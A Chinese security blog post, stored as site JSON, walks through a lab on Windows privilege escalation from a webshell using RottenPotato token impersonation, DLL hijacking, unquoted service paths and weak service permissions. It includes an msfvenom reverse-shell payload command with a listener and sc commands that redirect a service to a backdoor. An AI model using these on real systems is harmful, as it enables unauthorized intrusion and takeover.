{"title":"权限提升-windows提权2","uid":"c0a50503f3bb03b0879376d7c8e571c3","slug":"权限提升-windows提权2","date":"2022-06-21T15:02:18.000Z","updated":"2022-06-22T16:00:24.862Z","comments":true,"path":"api/articles/权限提升-windows提权2.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00-RottenPotato-烂土豆-配合令牌窃取提权\"><a href=\"#0x00-RottenPotato-烂土豆-配合令牌窃取提权\" class=\"headerlink\" title=\"0x00 RottenPotato(烂土豆)配合令牌窃取提权\"></a>0x00 RottenPotato(烂土豆)配合令牌窃取提权</h2><h3 id=\"0x00-原理\"><a href=\"#0x00-原理\" class=\"headerlink\" title=\"0x00 原理\"></a>0x00 原理</h3><p>1.欺骗“NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</p>\n<p>2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</p>\n<p>3.模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</p>\n<p>总结：一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。</p>\n<h3 id=\"0x01-烂土豆比热土豆的优点\"><a href=\"#0x01-烂土豆比热土豆的优点\" class=\"headerlink\" title=\"0x01 烂土豆比热土豆的优点\"></a>0x01 烂土豆比热土豆的优点</h3><p>1.100%可靠</p>\n<p>2.（当时）全版本通杀</p>\n<p>3.立即生效，不用像hot potato那样有时候需要等Windows更新才能使用</p>\n<p>总之，烂土豆是通过中间人攻击，将COM(NT\\SYSTEM权限)在第二步挑战应答过程中认证的区块改为自己的区块获取SYSTEM权限，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p>\n<h3 id=\"0x02-适用范围\"><a href=\"#0x02-适用范围\" class=\"headerlink\" title=\"0x02 适用范围\"></a>0x02 适用范围</h3><p>1、本地提权，只针对本地用户。</p>\n<p>2、适用于win7、8、10、2008、2012</p>\n<h3 id=\"0x03\"><a href=\"#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>流程：上传烂土豆-执行烂土豆-利用窃取模块-窃取 SYSTEM-成功</p>\n<p>（前提：已经获得webshell权限）</p>\n<p>使用msf生成一个后门：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>格式：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;<Your ip address> LPORT&#x3D;<Your port to connect on> -f exe &gt; 路径&#x2F;shell.exe</Your></Your></p></blockquote>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">命令：msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.216.150 lport&#x3D;5588 -f exe -o &#x2F;home&#x2F;xiaobai&#x2F;payload.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622220855245.png\" alt=\"image-20220622220855245\"></p>\n<h3 id=\"0x04\"><a href=\"#0x04\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>此时的权限是iusr：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622214231489.png\" alt=\"image-20220622214231489\"></p>\n<p>使用蚁剑将后门传上去：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622220937943.png\" alt=\"image-20220622220937943\"></p>\n<h3 id=\"0x05\"><a href=\"#0x05\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>配置msf监听会话：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">use exploit&#x2F;multi&#x2F;handler\nset payload windows&#x2F;meterpreter&#x2F;reverse_tcp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622221321314.png\" alt=\"image-20220622221321314\"></p>\n<h3 id=\"0x06\"><a href=\"#0x06\" class=\"headerlink\" title=\"0x06\"></a>0x06</h3><p>找到后门文件：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622215140698.png\" alt=\"image-20220622215140698\"></p>\n<p>利用webshell执行后门文件：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622221359402.png\" alt=\"image-20220622221359402\"></p>\n<h3 id=\"0x07\"><a href=\"#0x07\" class=\"headerlink\" title=\"0x07\"></a>0x07</h3><p>msf监听到ip:</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622221439091.png\" alt=\"image-20220622221439091\"></p>\n<p>查看权限：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622221508421.png\" alt=\"image-20220622221508421\"></p>\n<p>低权限。</p>\n<h3 id=\"0x08\"><a href=\"#0x08\" class=\"headerlink\" title=\"0x08\"></a>0x08</h3><p>上传烂土豆：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622221653119.png\" alt=\"image-20220622221653119\"></p>\n<p>运行：（要在msf上运行烂土豆）</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622222440045.png\" alt=\"image-20220622222440045\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622222422323.png\" alt=\"image-20220622222422323\"></p>\n<p>（这里不能单纯使用令牌窃取，令牌窃取需要足够的权限，管理员权限）</p>\n<h3 id=\"0x09\"><a href=\"#0x09\" class=\"headerlink\" title=\"0x09\"></a>0x09</h3><p>查看权限，还是iusr：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622222514092.png\" alt=\"image-20220622222514092\"></p>\n<h3 id=\"0x10\"><a href=\"#0x10\" class=\"headerlink\" title=\"0x10\"></a>0x10</h3><p>使用令牌窃取：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622223552766.png\" alt=\"image-20220622223552766\"></p>\n<p>（警告信息我们得知无法正常假冒用户，所以令牌假冒失败。）</p>\n<p>正常假冒用户列表如下：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622223457390.png\" alt=\"image-20220622223457390\"></p>\n<h3 id=\"0x11\"><a href=\"#0x11\" class=\"headerlink\" title=\"0x11\"></a>0x11</h3><p>得到系统权限：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622224757882.png\" alt=\"image-20220622224757882\"></p>\n<p>（具体的流程就是以上这样，使用烂土豆配合令牌窃取提权）</p>\n<p>windows内核EXP：</p>\n<p><a href=\"https://github.com/SecWiki/windows-kernel-exploits\">https://github.com/SecWiki/windows-kernel-exploits</a></p>\n<h2 id=\"0x01-DLL劫持配合令牌窃取提权\"><a href=\"#0x01-DLL劫持配合令牌窃取提权\" class=\"headerlink\" title=\"0x01 DLL劫持配合令牌窃取提权\"></a>0x01 DLL劫持配合令牌窃取提权</h2><h3 id=\"0x00-原理-1\"><a href=\"#0x00-原理-1\" class=\"headerlink\" title=\"0x00 原理\"></a>0x00 原理</h3><p>DLL劫持指的是，病毒通过一些手段来劫持或者替换正常的DLL，欺骗正常程序加载预先准备好的恶意DLL。</p>\n<p>如下图，LPK.dll是应用程序运行所需加载的DLL，该系统文件默认在C:\\Windows\\system32路径下，但由于windows优先搜索当前路径，所以当我们把恶意LPK.dll放在应用程序同一路径下，便会被程序成功加载，从而执行恶意操作。</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220621234543245.png\" alt=\"image-20220621234543245\"></p>\n<p>###0x01 DLL劫持前提条件</p>\n<p>1、有权限替换dll文件</p>\n<p>2、有第三方软件</p>\n<p>3、管理员必须运行此第三方软件</p>\n<h3 id=\"0x02\"><a href=\"#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>流程：信息收集（服务器上的第三方程序的信息）-进程调试（分析这个程序在运行的时候调用了那些dll）-制作 dll 并上传(制作后门dll去替换原有的dll)-替换 dll-启动应用后成功</p>\n<p>下载带有dll文件的第三方软件：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622225735540.png\" alt=\"image-20220622225735540\"></p>\n<p>下载火绒剑：</p>\n<p>：<a href=\"https://www.jb51.net/softs/490503.html\">https://www.jb51.net/softs/490503.html</a> </p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622230115819.png\" alt=\"image-20220622230115819\"></p>\n<h3 id=\"0x03-1\"><a href=\"#0x03-1\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>运行程序，使用火绒剑分析调用了那些dll文件：</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622231657443.png\" alt=\"image-20220622231657443\"></p>\n<p>这里只有一个数字签名文件，还是在c盘下；所有的dll文件都是在c盘windows下运行，导致没有权限替换dll文件。</p>\n<h3 id=\"0x04-1\"><a href=\"#0x04-1\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>思路：已经拿到了webshell权限，利用webshell权限上传能够替换的dll文件（这里的dll文件利用msf生成），之后利用msf监听IP端口，接着重新启动第三方软件，就会调用被替换的dll后门文件，msf监听到ip，再配合令牌窃取拿到系统权限。这就是利用dll劫持提权。</p>\n<p>（上图中所有的dll文件都在c盘windows目录下，webshell权限太低，无法上传到对应替换dll文件的目录下，就无法替换dll文件，一般要找运行第三方软件的目录或者有权限上传的目录，之后再进行dll文件替换）</p>\n<h3 id=\"0x05-1\"><a href=\"#0x05-1\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>应用程序加载的目录</p>\n<p>2、C:\\Windows\\System32</p>\n<p>3、C:\\Windows\\System</p>\n<p>4、C:\\Windows</p>\n<h2 id=\"0x02-不带引号服务路径配合MSF本地提权\"><a href=\"#0x02-不带引号服务路径配合MSF本地提权\" class=\"headerlink\" title=\"0x02 不带引号服务路径配合MSF本地提权\"></a>0x02 不带引号服务路径配合MSF本地提权</h2><h3 id=\"0x00-原理-2\"><a href=\"#0x00-原理-2\" class=\"headerlink\" title=\"0x00 原理\"></a>0x00 原理</h3><p>当 Windows 服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。</p>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p><strong>不加引号：C:\\Program Files\\phpstudy_pro\\COM\\phpStudyServer.exe</strong></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622233243166.png\" alt=\"image-20220622233243166\"></p>\n<p><strong>由于没加引号，这里的C:\\Program Files里的空格相当于截断了路径，如果在C盘有一个C:\\Program.exe系统就会优先运行它。</strong></p>\n<p><strong>加引号：”C:\\Program Files\\phpstudy_pro\\COM\\phpStudyServer.exe”</strong></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622233358779.png\" alt=\"image-20220622233358779\"></p>\n<p>可以看到两种情况返回的结果不一样。</p>\n<h3 id=\"0x02-1\"><a href=\"#0x02-1\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>过程:检测引号服务路径-利用路径制作文件并上传-启用服务或重启-调用后成功</p>\n<p>查看有哪些不带引号的服务：</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>命令：wmic service get name,displayname,pathname,startmode |findstr &#x2F;i “Auto” |findstr &#x2F;i &#x2F;v “C:\\Windows\\“ | findstr &#x2F;i &#x2F;v “””</p></blockquote>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622234212661.png\" alt=\"image-20220622234212661\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622234236519.png\" alt=\"image-20220622234236519\"></p>\n<p>列出很多不带引号的服务，筛选了所有的服务，没有一个文件名带有空格；因此无法利用。</p>\n<h3 id=\"0x03-2\"><a href=\"#0x03-2\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>类似下图的带空格的目录才可利用：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622234725729.png\" alt=\"image-20220622234725729\"></p>\n<h3 id=\"0x04-2\"><a href=\"#0x04-2\" class=\"headerlink\" title=\"0x04\"></a>0x04</h3><p>利用msf生成特殊目录的exe文件：Program.exe</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622234843823.png\" alt=\"image-20220622234843823\"></p>\n<p>之后利用webshell上传到c盘。</p>\n<h3 id=\"0x05-2\"><a href=\"#0x05-2\" class=\"headerlink\" title=\"0x05\"></a>0x05</h3><p>启动服务就会调用这个Program.exe这个木马文件，利用msf监听ip获取权限：<br><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622235152324.png\" alt=\"image-20220622235152324\"></p>\n<h2 id=\"0x03-不安全的服务权限配置提权-本地权限\"><a href=\"#0x03-不安全的服务权限配置提权-本地权限\" class=\"headerlink\" title=\"0x03 不安全的服务权限配置提权-本地权限\"></a>0x03 不安全的服务权限配置提权-本地权限</h2><h3 id=\"0x00-原理-3\"><a href=\"#0x00-原理-3\" class=\"headerlink\" title=\"0x00 原理\"></a>0x00 原理</h3><p>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。 过程:检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>创建一个服务：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sc create NewServiceName binpath&#x3D;&quot;C:\\Program.exe&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>这里为了方便自己建一个服务，实际情况下可以用真实的服务然后改指向文件。</p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622235508689.png\" alt=\"image-20220622235508689\"></p>\n<h3 id=\"0x02-2\"><a href=\"#0x02-2\" class=\"headerlink\" title=\"0x02\"></a>0x02</h3><p>使用微软自带的工具accesschk查看有哪些不安全的服务：</p>\n<p>工具下载链接：<a href=\"https://download.sysinternals.com/files/AccessChk.zip\">https://download.sysinternals.com/files/AccessChk.zip</a></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622235558301.png\" alt=\"image-20220622235558301\"></p>\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622235609371.png\" alt=\"image-20220622235609371\"></p>\n<h3 id=\"0x03-3\"><a href=\"#0x03-3\" class=\"headerlink\" title=\"0x03\"></a>0x03</h3><p>配置这个服务将它的路径指向我们的后门，开启服务MSF获得会话提权</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sc config &quot;NewServiceName&quot; binpath&#x3D;&quot;C:Programexe&quot;&#x2F;&#x2F;配置服务指向后门\nsc start &quot;NewServiceName&quot;&#x2F;&#x2F;开启服务<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-windows%E6%8F%90%E6%9D%832.htm/image-20220622235653078.png\" alt=\"image-20220622235653078\"></p>\n<h2 id=\"0x04-windows提权文章\"><a href=\"#0x04-windows提权文章\" class=\"headerlink\" title=\"0x04 windows提权文章\"></a>0x04 windows提权文章</h2><p>windows提权参考文章：<br><a href=\"https://xz.aliyun.com/t/2519\">https://xz.aliyun.com/t/2519</a></p>\n<p>大佬写的详细，值得细细揣摩。</p>\n","text":"0x00 RottenPotato(烂土豆)配合令牌窃取提权0x00 原理1.欺骗“NT AUTHORITY\\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。 2.对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\\SYSTEM”账户本地协商一个...","link":"","photos":[],"count_time":{"symbolsCount":"3.6k","symbolsTime":"3 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x00-RottenPotato-%E7%83%82%E5%9C%9F%E8%B1%86-%E9%85%8D%E5%90%88%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x00 RottenPotato(烂土豆)配合令牌窃取提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">0x00 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-%E7%83%82%E5%9C%9F%E8%B1%86%E6%AF%94%E7%83%AD%E5%9C%9F%E8%B1%86%E7%9A%84%E4%BC%98%E7%82%B9\"><span class=\"toc-text\">0x01 烂土豆比热土豆的优点</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-%E9%80%82%E7%94%A8%E8%8C%83%E5%9B%B4\"><span class=\"toc-text\">0x02 适用范围</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05\"><span class=\"toc-text\">0x05</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x06\"><span class=\"toc-text\">0x06</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x07\"><span class=\"toc-text\">0x07</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x08\"><span class=\"toc-text\">0x08</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x09\"><span class=\"toc-text\">0x09</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x10\"><span class=\"toc-text\">0x10</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x11\"><span class=\"toc-text\">0x11</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x01-DLL%E5%8A%AB%E6%8C%81%E9%85%8D%E5%90%88%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x01 DLL劫持配合令牌窃取提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8E%9F%E7%90%86-1\"><span class=\"toc-text\">0x00 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-1\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-1\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05-1\"><span class=\"toc-text\">0x05</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x02-%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E9%85%8D%E5%90%88MSF%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">0x02 不带引号服务路径配合MSF本地提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8E%9F%E7%90%86-2\"><span class=\"toc-text\">0x00 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-1\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-2\"><span class=\"toc-text\">0x03</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x04-2\"><span class=\"toc-text\">0x04</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x05-2\"><span class=\"toc-text\">0x05</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x03-%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E6%8F%90%E6%9D%83-%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90\"><span class=\"toc-text\">0x03 不安全的服务权限配置提权-本地权限</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x00-%E5%8E%9F%E7%90%86-3\"><span class=\"toc-text\">0x00 原理</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x01-1\"><span class=\"toc-text\">0x01</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x02-2\"><span class=\"toc-text\">0x02</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#0x03-3\"><span class=\"toc-text\">0x03</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#0x04-windows%E6%8F%90%E6%9D%83%E6%96%87%E7%AB%A0\"><span class=\"toc-text\">0x04 windows提权文章</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"权限提升-Linux提权1","uid":"fcd910c24ec5aac777084d6a38361ecb","slug":"权限提升-Linux提权1","date":"2022-06-23T01:10:48.000Z","updated":"2022-06-24T13:07:43.590Z","comments":true,"path":"api/articles/权限提升-Linux提权1.json","keywords":null,"cover":[],"text":"0x00脑图： 0x01 信息收集LinEnum、linuxprivchecker脚本0x00 LinEnum需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下。 （tmp目录是linux临时目录，可读写可执行，若是上传其他目录有可能当前权...","link":"","photos":[],"count_time":{"symbolsCount":"4.1k","symbolsTime":"4 